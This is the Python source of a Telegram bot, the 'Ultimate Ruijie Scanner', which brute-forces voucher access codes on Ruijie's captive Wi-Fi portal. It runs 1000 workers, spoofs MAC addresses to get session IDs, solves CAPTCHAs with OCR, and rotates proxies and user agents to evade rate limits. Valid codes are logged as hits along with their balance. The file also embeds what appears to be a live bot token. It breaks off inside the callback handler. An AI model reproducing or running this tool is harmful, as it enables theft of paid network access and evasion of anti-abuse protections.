#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
⚡ ULTIMATE RUIJIE SCANNER BOT (RAILWAY 24/7 COMPATIBLE) ⚡
1000 Workers | Direct Mode | Resume | Hit File | Hit Clear | Proxy Clear | Keep-Alive Flask
"""

import os
import sys
import re
import json
import time
import random
import hashlib
import asyncio
import datetime
import traceback
import string
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, urlunparse
from flask import Flask
from threading import Thread

import aiohttp
from aiohttp_socks import ProxyConnector

try:
    import ddddocr
    HAS_OCR = True
except ImportError:
    HAS_OCR = False

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, filters, ContextTypes,
)

# ═══════════════════════════════════════════════════════════════════
#  FLASK KEEP-ALIVE SERVER (RAILWAY 24/7 SUPPORT)
# ═══════════════════════════════════════════════════════════════════
app = Flask('')

@app.route('/')
def home():
    return "Bot is active and running 24/7!"

def run_flask():
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()

# ═══════════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════════
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8682190407:AAGmfFT_Su-NjLPBiVicNu-Ugkh4KBcYdik")
ADMIN_IDS = [int(x) for x in os.environ.get("ADMIN_IDS", "8284079094,7954883652,8313960124,6287753590,7936325368,5721109642,8008903760,8692479413,7906338023").split(",")]

STATE_FILE = "state.json"
PROXY_FILE = "proxies.txt"
TRIED_FILE_TMPL = "tried_{}.txt"
PORTAL_FILE_TMPL = "portal_{}.txt"
HITS_FILE = "allhits.txt"

NUM_WORKERS = 1000
MAX_CODES_PER_SID = 30
MAX_CODES_PER_SESSION = 500
TIMEOUT_SEC = 15
BALANCE_TIMEOUT = 10
CONNECTOR_LIMIT = 3000

DIRECT = "direct"
DIRECT_SLOTS = 60

PORTAL_BASE = "https://portal-as.ruijienetworks.com"
PORTAL_INDEX = PORTAL_BASE + "/download/static/maccauth/src/index.html"
VOUCHER_URL = PORTAL_BASE + "/api/auth/voucher/?lang=en_US"
CAPTCHA_IMAGE_URL = PORTAL_BASE + "/api/auth/captcha/image"
CAPTCHA_VERIFY_URL = PORTAL_BASE + "/api/auth/captcha/verify"
BALANCE_API = PORTAL_BASE + "/api/auth/balance/getBalance/"

CHARSET_DIGITS = "012345678"
CHARSET_ABC = "abcdefghijkmnpqrstuvwxyz"
CHARSET_MIX = "0123456789abcdefghijklmnopqrstuvwxyz"

MODES = {
    "num6": "🩸 06 NUM", "num7": "🩸 07 NUM", "num8": "🩸 08 NUM",
    "num9": "🩸 09 NUM", "mix6": "💀 06 MIX", "mix7": "💀 07 MIX",
    "mix8": "💀 08 MIX", "abc6": "📜 06 ABC",
}

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
]

_ocr = None
_proxy_manager = None
user_scanners = {}
_state_lock = asyncio.Lock()


# ═══════════════════════════════════════════════════════════════════
#  PROXY MANAGER
# ═══════════════════════════════════════════════════════════════════
class ProxyManager:
    def __init__(self, file_path):
        self.file_path = file_path
        self.proxies = []
        self.bad_proxies = set()
        self.index = 0
        self.lock = asyncio.Lock()
        self.direct_enabled = True
        self.load()

    def _normalize(self, proxy):
        proxy = (proxy or "").strip()
        if not proxy or proxy.startswith("#"):
            return None
        if not proxy.startswith(("http://", "https://", "socks4://", "socks5://")):
            proxy = "socks5://" + proxy
        return proxy

    def load(self):
        try:
            if not os.path.exists(self.file_path):
                with open(self.file_path, "w") as f:
                    pass
                self.proxies = []
                return
            with open(self.file_path) as f:
                raw = f.read().splitlines()
            valid = []
            for line in raw:
                p = self._normalize(line)
                if p:
                    valid.append(p)
            seen = set()
            real_proxies = []
            for p in valid:
                if p not in seen:
                    seen.add(p)
                    real_proxies.append(p)
            self.proxies = real_proxies[:]
            if self.direct_enabled:
                self.proxies.extend([DIRECT] * DIRECT_SLOTS)
            random.shuffle(self.proxies)
        except Exception:
            self.proxies = [DIRECT] * DIRECT_SLOTS if self.direct_enabled else []

    def reload(self):
        self.load()

    async def get_next(self):
        async with self.lock:
            if not self.proxies:
                return DIRECT if self.direct_enabled else None
            available = [p for p in self.proxies if p not in self.bad_proxies]
            if not available:
                self.bad_proxies.clear()
                available = self.proxies[:]
            p = available[self.index % len(available)]
            self.index += 1
            return p

    async def mark_bad(self, proxy):
        if not proxy or proxy == DIRECT:
            return
        async with self.lock:
            self.bad_proxies.add(proxy)

    async def set_direct_enabled(self, enabled):
        async with self.lock:
            self.direct_enabled = bool(enabled)
        self.load()

    def purge_dead(self):
        try:
            before = len(self.proxies)
            self.proxies = [p for p in self.proxies if p == DIRECT or p not in self.bad_proxies]
            self.bad_proxies.clear()
            self.load()
            return before - len(self.proxies)
        except Exception:
            return 0

    def stats(self):
        real_total = sum(1 for p in self.proxies if p != DIRECT)
        real_alive = sum(1 for p in self.proxies if p != DIRECT and p not in self.bad_proxies)
        return real_total, real_alive

    def stats_detailed(self):
        real_total = sum(1 for p in self.proxies if p != DIRECT)
        real_alive = sum(1 for p in self.proxies if p != DIRECT and p not in self.bad_proxies)
        return real_total, real_alive, len(self.bad_proxies), self.direct_enabled


def get_proxy_manager():
    global _proxy_manager
    if _proxy_manager is None:
        _proxy_manager = ProxyManager(PROXY_FILE)
    return _proxy_manager


def create_connector_for_proxy(proxy):
    if not proxy or proxy == DIRECT:
        return aiohttp.TCPConnector(limit=CONNECTOR_LIMIT, ssl=False,
                                     enable_cleanup_closed=True, ttl_dns_cache=600)
    try:
        return ProxyConnector.from_url(proxy, limit=CONNECTOR_LIMIT, ssl=False,
                                        enable_cleanup_closed=True, ttl_dns_cache=600)
    except Exception:
        return None

# ═══════════════════════════════════════════════════════════════════
#  OCR
# ═══════════════════════════════════════════════════════════════════
def get_ocr():
    global _ocr
    if _ocr is None and HAS_OCR:
        _ocr = ddddocr.DdddOcr(show_ad=False)
    return _ocr


def ocr_image_bytes_fast(image_bytes):
    try:
        ocr = get_ocr()
        if ocr is None:
            return None
        result = ocr.classification(image_bytes)
        return result.strip().upper() if result else None
    except Exception:
        return None


async def solve_captcha(session, captcha_url, headers):
    try:
        async with session.get(captcha_url, headers=headers,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as resp:
            if resp.status != 200:
                return None
            img = await resp.read()
        if not img:
            return None
        return await asyncio.to_thread(ocr_image_bytes_fast, img)
    except Exception:
        return None


# ═══════════════════════════════════════════════════════════════════
#  USER DATA HELPERS
# ═══════════════════════════════════════════════════════════════════
def get_portal_url(user_id):
    p_file = PORTAL_FILE_TMPL.format(user_id)
    if os.path.exists(p_file):
        try:
            with open(p_file) as f:
                return f.read().strip() or None
        except OSError:
            pass
    return None


def set_portal_url(user_id, url):
    try:
        with open(PORTAL_FILE_TMPL.format(user_id), "w") as f:
            f.write(url)
    except OSError:
        pass


def load_tried_codes(user_id):
    f = TRIED_FILE_TMPL.format(user_id)
    if not os.path.exists(f):
        return set()
    try:
        with open(f) as fp:
            return set(line.strip() for line in fp if line.strip())
    except Exception:
        return set()


def save_tried_codes(user_id, codes):
    try:
        f = TRIED_FILE_TMPL.format(user_id)
        with open(f, "a") as fp:
            for c in codes:
                fp.write(f"{c}\n")
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
#  STATE MANAGEMENT
# ═══════════════════════════════════════════════════════════════════
def _load_all_states():
    try:
        if not os.path.exists(STATE_FILE):
            return {}
        with open(STATE_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception:
        return {}


def _save_all_states(data):
    try:
        tmp = STATE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        os.replace(tmp, STATE_FILE)
    except Exception:
        pass


def save_user_state(user_id, state):
    try:
        all_data = _load_all_states()
        payload = {
            "portal_url": state.get("portal_url", ""),
            "mode": state.get("mode", "num6"),
            "tried": state.get("tried", 0),
            "hits": state.get("hits", 0),
            "limits": state.get("limits", 0),
            "net": state.get("net", 0),
            "hit_details": [],
            "started_at": state.get("started_at_str", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")),
            "updated_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        }
        for h in state.get("hit_details", []):
            t = h.get("time")
            at = t.strftime("%Y-%m-%d %H:%M:%S") if isinstance(t, datetime.datetime) else str(t)
            payload["hit_details"].append({
                "code": h.get("code", "?"),
                "plan": h.get("plan", "Unknown"),
                "time_str": h.get("time_str", "N/A"),
                "at": at,
            })
        all_data[str(user_id)] = payload
        _save_all_states(all_data)
    except Exception:
        pass


def load_user_state(user_id):
    all_data = _load_all_states()
    return all_data.get(str(user_id))


def deserialize_hits(hits):
    result = []
    for h in hits:
        try:
            t = datetime.datetime.strptime(h.get("at", ""), "%Y-%m-%d %H:%M:%S")
        except Exception:
            t = datetime.datetime.now()
        result.append({
            "code": h.get("code", "?"),
            "plan": h.get("plan", "Unknown"),
            "time_str": h.get("time_str", "N/A"),
            "time": t,
        })
    return result

# ═══════════════════════════════════════════════════════════════════
#  BALANCE CHECKER
# ═══════════════════════════════════════════════════════════════════
async def fetch_balance(active_token, proxy):
    if not active_token:
        return "Unknown", "N/A"
    connector = create_connector_for_proxy(proxy)
    try:
        async with aiohttp.ClientSession(connector=connector) as s:
            url = f"{BALANCE_API}{active_token}"
            headers = {
                "accept": "application/json, text/javascript, */*; q=0.01",
                "content-type": "application/json;",
                "user-agent": random.choice(USER_AGENTS),
                "x-requested-with": "XMLHttpRequest",
                "Origin": PORTAL_BASE,
                "Referer": f"{PORTAL_BASE}/download/static/maccauth/src/balance.html?sessionId={active_token}&lang=en_US",
            }
            async with s.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=BALANCE_TIMEOUT), ssl=False) as resp:
                if resp.status != 200:
                    return "Unknown", "N/A"
                try:
                    data = await resp.json(content_type=None)
                except Exception:
                    return "Unknown", "N/A"
                inner = data.get("result", data)
                if not isinstance(inner, dict):
                    return "Unknown", "N/A"
                plan = inner.get("profileName") or inner.get("planName") or "Unknown"
                remaining = inner.get("remainingMinutes")
                if remaining is not None:
                    remaining = int(remaining)
                    if remaining >= 0:
                        hh, mm = divmod(remaining, 60)
                        return plan, f"{hh}h {mm}m" if hh else f"{mm}m"
                    return plan, f"Expired ({remaining}m)"
                total = inner.get("totalMinutes") or inner.get("totalTime")
                if total is not None:
                    hh, mm = divmod(int(total), 60)
                    return plan, f"{hh}h {mm}m" if hh else f"{mm}m"
                return plan, "N/A"
    except Exception:
        return "Unknown", "N/A"


async def check_balance_and_update(active_token, code, user_id, proxy):
    ud = user_scanners.get(user_id)
    if not ud:
        return
    plan, time_str = await fetch_balance(active_token, proxy)
    for item in ud.get("hit_details", []):
        if item["code"] == code:
            item["plan"] = plan
            item["time_str"] = time_str
            break
    try:
        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(HITS_FILE, "a") as f:
            f.write(f"[{now}] {code} | {plan} | {time_str}\n")
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
#  CORE CHECKER
# ═══════════════════════════════════════════════════════════════════
async def get_sid_from_gateway(session, portal_url):
    headers = {"User-Agent": random.choice(USER_AGENTS)}
    try:
        mac = ":".join("%02x" % random.randint(0, 255) for _ in range(6))
        u = urlparse(portal_url)
        query = parse_qs(u.query)
        query["mac"] = [mac]
        spoofed_url = urlunparse(u._replace(query=urlencode(query, doseq=True)))

        async with session.get(spoofed_url, headers=headers, allow_redirects=True,
                               timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as r:
            body = await r.text()
            final_url = str(r.url)

            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            if m:
                next_url = urljoin(spoofed_url, m.group(1))
                try:
                    async with session.get(next_url, headers=headers, allow_redirects=True,
                                           timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as r2:
                        final_url = str(r2.url)
                        try:
                            body = await r2.text()
                        except Exception:
                            pass
                except Exception:
                    final_url = next_url

        parsed = parse_qs(urlparse(final_url).query)
        sid = parsed.get("sessionId", parsed.get("sid", [None]))[0]
        if sid:
            return sid
        m = re.search(r"[?&](?:sessionId|sid)=([a-zA-Z0-9]+)", final_url)
        if m:
            return m.group(1)
        m = re.search(r"(?:sessionId|sid)=([a-zA-Z0-9]+)", body)
        if m:
            return m.group(1)
        return None
    except Exception:
        return None


async def check_single_access_code(session, code, sid, proxy):
    if not sid:
        return "net", None
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": PORTAL_BASE,
        "referer": f"{PORTAL_BASE}/download/static/maccauth/src/index.html",
        "user-agent": random.choice(USER_AGENTS),
    }
    retry = 0
    while retry < 5:
        try:
            captcha_url = f"{CAPTCHA_IMAGE_URL}?sessionId={sid}&_t={int(time.time() * 1000)}"
            img_headers = {
                "accept": "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8",
                "referer": headers["referer"],
                "user-agent": random.choice(USER_AGENTS),
            }
            captcha_text = await solve_captcha(session, captcha_url, img_headers)
            if not captcha_text or len(captcha_text) < 2:
                retry += 1
                continue

            v_headers = {
                "accept": "*/*",
                "content-type": "application/json",
                "origin": PORTAL_BASE,
                "referer": headers["referer"],
                "user-agent": random.choice(USER_AGENTS),
            }
            async with session.post(CAPTCHA_VERIFY_URL,
                                    json={"sessionId": sid, "authCode": captcha_text},
                                    headers=v_headers,
                                    timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as v_resp:
                v_body = await v_resp.text()
            verified = False
            try:
                if json.loads(v_body).get("success") is True:
                    verified = True
            except Exception:
                if '"success":true' in v_body.replace(" ", ""):
                    verified = True
            if not verified:
                retry += 1
                continue

            l_headers = {
                "accept": "*/*",
                "content-type": "application/json",
                "origin": PORTAL_BASE,
                "referer": headers["referer"],
                "user-agent": random.choice(USER_AGENTS),
            }
            async with session.post(VOUCHER_URL,
                                    json={"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": captcha_text},
                                    headers=l_headers,
                                    timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC), ssl=False) as l_resp:
                body = await l_resp.text()

            low = body.lower()
            if '"success":true' in body.replace(" ", ""):
                return "hit", body
            if "request limited" in low:
                retry += 1
                if retry < 5:
                    continue
                return "limit", body
            if "exceeds the limit" in low or "the number of sta" in low:
                return "limit", body
            if "expired" in low:
                return "expired", body
            return "bad", body
        except (asyncio.TimeoutError, aiohttp.ClientError, OSError):
            return "net", None
        except asyncio.CancelledError:
            raise
        except Exception:
            return "net", None
    return "failed", None

# ═══════════════════════════════════════════════════════════════════
#  CODE GENERATOR
# ═══════════════════════════════════════════════════════════════════
def make_code(mode, counter=None):
    if mode == "num6":
        return "".join(random.choices(CHARSET_DIGITS, k=6))
    if mode == "num7":
        return "".join(random.choices(CHARSET_DIGITS, k=7))
    if mode == "num8":
        return "".join(random.choices(CHARSET_DIGITS, k=8))
    if mode == "num9":
        return "".join(random.choices(CHARSET_DIGITS, k=9))
    if mode == "mix6":
        return "".join(random.choices(CHARSET_MIX, k=6))
    if mode == "mix7":
        return "".join(random.choices(CHARSET_MIX, k=7))
    if mode == "mix8":
        return "".join(random.choices(CHARSET_MIX, k=8))
    if mode == "abc6":
        return "".join(random.choices(CHARSET_ABC, k=6))
    return "".join(random.choices(CHARSET_DIGITS, k=6))


# ═══════════════════════════════════════════════════════════════════
#  WORKER
# ═══════════════════════════════════════════════════════════════════
async def worker(worker_id, user_id):
    pm = get_proxy_manager()
    ud = user_scanners.get(user_id)
    if not ud:
        return

    stop_event = ud["stop_event"]
    mode = ud.get("mode", "num6")
    tried = ud["tried_codes"]
    portal_url = ud["portal_url"]

    while not stop_event.is_set():
        proxy = await pm.get_next()
        connector = create_connector_for_proxy(proxy)
        session = None
        try:
            session = aiohttp.ClientSession(
                connector=connector,
                connector_owner=True,
                cookie_jar=aiohttp.CookieJar(),
                timeout=aiohttp.ClientTimeout(total=TIMEOUT_SEC),
                headers={"user-agent": random.choice(USER_AGENTS)},
            )
            sid = None
            codes_this_sid = 0
            session_codes = 0
            sid_failures = 0

            while not stop_event.is_set() and session_codes < MAX_CODES_PER_SESSION:
                if sid is None or codes_this_sid >= MAX_CODES_PER_SID:
                    new_sid = await get_sid_from_gateway(session, portal_url)
                    if not new_sid:
                        sid_failures += 1
                        ud["net"] += 1
                        ud["recent_logs"].append("⚠️ SID FAIL")
                        if sid_failures >= 3:
                            await pm.mark_bad(proxy)
                            break
                        await asyncio.sleep(0.15)
                        continue
                    sid = new_sid
                    codes_this_sid = 0
                    sid_failures = 0

                if len(tried) > 500000:
                    ud["tried_codes"] = set()
                    tried = ud["tried_codes"]

                code = None
                for _ in range(50):
                    code = make_code(mode, ud.get("counter", 0))
                    if code not in tried:
                        break
                if code is None:
                    break
                tried.add(code)
                ud["current_code"] = code

                result, body = await check_single_access_code(session, code, sid, proxy)
                codes_this_sid += 1
                session_codes += 1
                ud["tried"] += 1

                if result == "hit":
                    ud["hits"] += 1
                    ud["hit_list"].append(code)
                    ud["last_hit"] = code
                    ud["recent_logs"].append(f"🔥 HIT: {code}")
                    active_token = sid
                    if body:
                        m = re.search(r'token=([^&\s"\'<>]+)', body, re.IGNORECASE)
                        if m:
                            active_token = m.group(1)
                    ud["hit_details"].append({
                        "code": code,
                        "time": datetime.datetime.now(),
                        "plan": "...",
                        "time_str": "...",
                    })
                    asyncio.create_task(check_balance_and_update(active_token, code, user_id, proxy))
                    save_tried_codes(user_id, [code])
                    break
                elif result == "limit":
                    ud["limits"] += 1
                    ud["recent_logs"].append(f"⚠️ LIMIT: {code}")
                    sid = None
                elif result == "net":
                    ud["net"] += 1
                    sid = None
                    break
                elif result == "expired":
                    ud["failed"] += 1
                else:
                    ud["failed"] += 1

                await asyncio.sleep(0.001)
        except asyncio.CancelledError:
            raise
        except Exception:
            ud["net"] += 1
        finally:
            if session:
                try:
                    await session.close()
                except Exception:
                    pass
        if stop_event.is_set():
            break


# ═══════════════════════════════════════════════════════════════════
#  HIT FILE DOWNLOAD
# ═══════════════════════════════════════════════════════════════════
async def send_hits_file(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    ud = user_scanners.get(user_id, {})
    hits = ud.get("hit_details", [])
    
    if not hits:
        await update.effective_message.reply_text("📦 **No hits yet.**", parse_mode=ParseMode.MARKDOWN)
        return
    
    lines = []
    lines.append("=" * 50)
    lines.append("⚡ ULTIMATE SCANNER - HIT LIST ⚡")
    lines.append("=" * 50)
    lines.append(f"User ID: {user_id}")
    lines.append(f"Total Hits: {len(hits)}")
    lines.append(f"Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("=" * 50)
    lines.append("")
    lines.append(f"{'No':<5} {'Code':<15} {'Plan':<15} {'Time':<15}")
    lines.append("-" * 50)
    
    for i, h in enumerate(hits, 1):
        code = h.get("code", "?")
        plan = h.get("plan", "N/A")
        time_str = h.get("time_str", "N/A")
        lines.append(f"{i:<5} {code:<15} {plan:<15} {time_str:<15}")
    
    lines.append("")
    lines.append("=" * 50)
    
    content = "\n".join(lines)
    filename = f"hits_{user_id}_{int(time.time())}.txt"
    filepath = os.path.join("/tmp", filename)
    
    try:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)
    except Exception as e:
        await update.effective_message.reply_text(f"❌ File error: {e}")
        return
    
    try:
        with open(filepath, "rb") as f:
            await update.effective_message.reply_document(
                document=f,
                filename=filename,
                caption=f"📦 **HIT LIST**\n🔥 Total: `{len(hits)}`",
                parse_mode=ParseMode.MARKDOWN)
    except Exception as e:
        await update.effective_message.reply_text(f"❌ Send error: {e}")
    
    try:
        os.remove(filepath)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
#  HIT CLEAR
# ═══════════════════════════════════════════════════════════════════
async def clear_user_hits(user_id: int) -> int:
    ud = user_scanners.get(user_id)
    if not ud:
        return 0
    count = len(ud.get("hit_details", []))
    ud["hit_details"] = []
    ud["hit_list"] = []
    ud["hits"] = 0
    save_user_state(user_id, ud)
    return count


# ═══════════════════════════════════════════════════════════════════
#  PROXY CLEAR
# ═══════════════════════════════════════════════════════════════════
async def clear_all_proxies() -> int:
    pm = get_proxy_manager()
    old_count = len([p for p in pm.proxies if p != DIRECT])
    try:
        with open(PROXY_FILE, "w") as f:
            pass
    except Exception:
        pass
    pm.proxies = [DIRECT] * DIRECT_SLOTS if pm.direct_enabled else []
    pm.bad_proxies.clear()
    pm.index = 0
    return old_count

# ═══════════════════════════════════════════════════════════════════
#  LIVE DASHBOARD
# ═══════════════════════════════════════════════════════════════════
async def live_dashboard_updater(context, user_id):
    ud = user_scanners.get(user_id)
    if not ud:
        return
    stop_event = ud["stop_event"]
    dash_id = ud.get("dash_msg_id")
    pm = get_proxy_manager()
    try:
        while not stop_event.is_set():
            await asyncio.sleep(5)
            if stop_event.is_set():
                break
            elapsed = max(time.time() - ud["start_time"], 1)
            speed = int(ud["tried"] / elapsed * 60)
            real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()
            if real_total == 0:
                proxy_line = f"DIRECT ({DIRECT_SLOTS})" if direct_on else "EMPTY ❌"
            elif real_alive == 0:
                proxy_line = "fallback → DIRECT" if direct_on else f"ALL DEAD ❌ ({real_total})"
            else:
                extra = f"  💀 {dead_cnt}" if dead_cnt > 0 else ""
                proxy_line = f"{real_alive}/{real_total}{extra}"

            hit_lines = []
            for h in ud.get("hit_details", [])[-10:]:
                hit_lines.append(f"`{h['code']}` - {h.get('plan', '...')} | {h.get('time_str', '...')}")
            hits_block = "\n".join(hit_lines) if hit_lines else "— no hits yet —"
            text = (
                "⚡ **ULTIMATE SCANNER** ⚡\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🏹 Tried: `{ud['tried']:,}`\n"
                f"🔥 Hits: `{ud['hits']}`\n"
                f"⚠️ Limits: `{ud['limits']}`\n"
                f"❌ Net: `{ud['net']}`\n"
                f"⚡ Speed: `{speed:,} c/m`\n"
                f"🔀 Proxies: `{proxy_line}`\n"
                f"🔀 Direct: `{'ON' if direct_on else 'OFF'}`\n"
                f"🎯 Current: `{ud.get('current_code', '—')}`\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🎁 **HITS**\n{hits_block}\n"
                "━━━━━━━━━━━━━━━━━━━━━━"
            )
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP", callback_data="stop_scan")]])
            try:
                await context.bot.edit_message_text(
                    chat_id=user_id, message_id=dash_id, text=text,
                    parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
            except Exception:
                pass
    except asyncio.CancelledError:
        raise


async def final_dashboard(context, user_id, ud):
    pm = get_proxy_manager()
    total, active = pm.stats()
    elapsed = max(time.time() - ud["start_time"], 1)
    speed = int(ud["tried"] / elapsed * 60)
    hit_lines = []
    for h in ud.get("hit_details", []):
        hit_lines.append(f"`{h['code']}` - {h.get('plan', '...')} | {h.get('time_str', '...')}")
    hits_block = "\n".join(hit_lines) if hit_lines else "— no hits —"
    text = (
        "💀 **SCAN ENDED** 💀\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🏹 Tried: `{ud['tried']:,}`\n"
        f"🔥 Hits: `{ud['hits']}`\n"
        f"⚠️ Limits: `{ud['limits']}`\n"
        f"❌ Net: `{ud['net']}`\n"
        f"⚡ Speed: `{speed:,} c/m`\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎁 **ALL HITS**\n{hits_block}\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    kb = InlineKeyboardMarkup([[InlineKeyboardButton("‹ RETURN", callback_data="btn_back_main")]])
    try:
        await context.bot.edit_message_text(
            chat_id=user_id, message_id=ud["dash_msg_id"], text=text,
            parse_mode=ParseMode.MARKDOWN, reply_markup=kb)
    except Exception:
        pass


# ═══════════════════════════════════════════════════════════════════
#  START SCANNER
# ═══════════════════════════════════════════════════════════════════
async def run_user_scanner(context, user_id):
    if user_scanners.get(user_id, {}).get("running"):
        return

    pm = get_proxy_manager()
    portal_url = get_portal_url(user_id) or PORTAL_INDEX
    saved = load_user_state(user_id)
    resume = False
    if saved and saved.get("portal_url") == portal_url and saved.get("tried", 0) > 0:
        resume = True

    if resume and saved:
        tried = load_tried_codes(user_id)
        hit_details = deserialize_hits(saved.get("hit_details", []))
        mode = saved.get("mode", "num6")
        tried_count = saved.get("tried", 0)
        hits = saved.get("hits", 0)
        limits = saved.get("limits", 0)
        net = saved.get("net", 0)
        started_at = saved.get("started_at", datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    else:
        tried = set()
        hit_details = []
        mode = context.user_data.get("selected_mode", "num6")
        tried_count = 0
        hits = 0
        limits = 0
        net = 0
        started_at = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    ud = {
        "running": True, "context": context, "user_id": user_id,
        "portal_url": portal_url, "mode": mode,
        "stop_event": asyncio.Event(),
        "tried": tried_count, "hits": hits, "limits": limits, "net": net, "failed": 0,
        "hit_list": [h["code"] for h in hit_details],
        "tried_codes": tried, "recent_logs": [],
        "last_hit": hit_details[-1]["code"] if hit_details else None,
        "current_code": "—", "start_time": time.time(),
        "hit_details": hit_details, "started_at_str": started_at,
        "counter": 0, "tasks": [], "dash_msg_id": None,
    }
    user_scanners[user_id] = ud

    real_total, real_alive, dead_cnt, direct_on = pm.stats_detailed()

    if real_total == 0 and direct_on:
        await context.bot.send_message(chat_id=user_id,
            text="⚠️ **No proxies loaded!** Running in **Direct Mode**.",
            parse_mode=ParseMode.MARKDOWN)
    elif real_total == 0 and not direct_on:
        await context.bot.send_message(chat_id=user_id,
            text="❌ **Cannot start!** No proxies AND Direct OFF.",
            parse_mode=ParseMode.MARKDOWN)
        ud["running"] = False
        return
    elif real_alive == 0 and direct_on and real_total > 0:
        await context.bot.send_message(chat_id=user_id,
            text=f"⚠️ All {real_total} proxies dead. Falling back to **Direct**.",
            parse_mode=ParseMode.MARKDOWN)
    elif real_alive == 0 and not direct_on and real_total > 0:
        await context.bot.send_message(chat_id=user_id,
            text=f"❌ All {real_total} proxies dead AND Direct OFF.",
            parse_mode=ParseMode.MARKDOWN)
        ud["running"] = False
        return

    dash = await context.bot.send_message(chat_id=user_id,
        text="🔮 Starting scanner...", parse_mode=ParseMode.MARKDOWN)
    ud["dash_msg_id"] = dash.message_id
    save_user_state(user_id, ud)

    tasks = [asyncio.create_task(worker(i, user_id)) for i in range(NUM_WORKERS)]
    tasks.append(asyncio.create_task(live_dashboard_updater(context, user_id)))
    ud["tasks"] = tasks

    try:
        await ud["stop_event"].wait()
    except asyncio.CancelledError:
        pass
    finally:
        for t in tasks:
            if not t.done():
                t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)
        save_user_state(user_id, ud)
        try:
            await final_dashboard(context, user_id, ud)
        except Exception:
            pass
        ud["running"] = False

# ═══════════════════════════════════════════════════════════════════
#  UI MARKUPS
# ═══════════════════════════════════════════════════════════════════
def get_main_menu_markup():
    pm = get_proxy_manager()
    direct_label = f"🔀 DIRECT: {'ON' if pm.direct_enabled else 'OFF'}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔮 PORTAL", callback_data="btn_portal"),
         InlineKeyboardButton("📜 MODES", callback_data="btn_modes")],
        [InlineKeyboardButton("⚡ START SCAN", callback_data="btn_start"),
         InlineKeyboardButton("🛑 STOP SCAN", callback_data="stop_scan")],
        [InlineKeyboardButton("🕷️ ADD PROXIES", callback_data="btn_add_proxies"),
         InlineKeyboardButton("🧹 CLEAR PROXIES", callback_data="btn_clear_proxies")],
        [InlineKeyboardButton("📦 MY HITS", callback_data="btn_hits"),
         InlineKeyboardButton("📥 DOWNLOAD HITS", callback_data="btn_download_hits")],
        [InlineKeyboardButton("🗑 CLEAR HITS", callback_data="btn_clear_hits"),
         InlineKeyboardButton(direct_label, callback_data="btn_toggle_direct")],
        [InlineKeyboardButton("👁️ STATUS", callback_data="btn_status")],
    ])


def get_mode_menu_markup():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🩸 06 NUM", callback_data="set_mode_num6"),
         InlineKeyboardButton("🩸 07 NUM", callback_data="set_mode_num7")],
        [InlineKeyboardButton("🩸 08 NUM", callback_data="set_mode_num8"),
         InlineKeyboardButton("🩸 09 NUM", callback_data="set_mode_num9")],
        [InlineKeyboardButton("💀 06 MIX", callback_data="set_mode_mix6"),
         InlineKeyboardButton("💀 07 MIX", callback_data="set_mode_mix7")],
        [InlineKeyboardButton("💀 08 MIX", callback_data="set_mode_mix8"),
         InlineKeyboardButton("📜 06 ABC", callback_data="set_mode_abc6")],
        [InlineKeyboardButton("🦇 RETURN", callback_data="btn_back_main")],
    ])


# ═══════════════════════════════════════════════════════════════════
#  CALLBACK HANDLER
# ═══════════════════════════════════════════════════════════════════
async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    data = query.data
    ud = user_scanners.get(user_id, {})
    pm = get_proxy_manager()
